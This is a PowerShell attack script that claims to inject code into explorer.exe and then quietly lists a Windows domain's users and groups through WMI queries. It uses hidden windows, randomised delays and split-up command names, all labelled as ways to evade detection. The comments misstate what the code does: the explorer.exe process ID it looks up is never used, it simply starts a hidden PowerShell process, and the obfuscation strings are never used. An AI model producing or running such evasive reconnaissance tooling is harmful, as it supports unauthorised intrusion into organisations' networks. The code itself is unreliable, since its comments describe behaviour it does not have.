# Function to inject into explorer.exe
function Invoke-ProcessInjection {
    $explorerPID = (Get-Process explorer | Select-Object -First 1).Id
    $code = {
        # Obfuscation for WMI query (avoiding net.exe or dsquery.exe usage)
        $domain = ([wmiclass]"\\.\root\cimv2:Win32_ComputerSystem").Domain
        $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        # Obfuscated enumeration for domain users and groups
        $users = "Select * From Win32_UserAccount Where Domain='$domain'"
        $usersEnum = ([WmiClass]"\\.\root\cimv2:Win32_UserAccount").ExecQuery($users)

        # Enumerating groups without Get-ADGroup
        $groups = "Select * From Win32_Group Where Domain='$domain'"
        $groupsEnum = ([WmiClass]"\\.\root\cimv2:Win32_Group").ExecQuery($groups)

        # Delay execution to avoid detection from burst activity
        Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)

        # Output results
        $usersEnum | ForEach-Object { $_.Name }
        $groupsEnum | ForEach-Object { $_.Name }
    }

    # Inject the code into explorer.exe
    Start-Process -FilePath powershell.exe -ArgumentList "-nop -w hidden -c $code" -PassThru -NoNewWindow
}

# Obfuscation technique: breaking up common commandlets
$GetWmiObject = "GWMI"
$StartProcess = "S" + "t" + "a" + "r" + "t-" + "Pr" + "ocess"

# Random delay to evade detection
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 20)

# Inject into trusted explorer.exe and execute the enumeration
Invoke-ProcessInjection
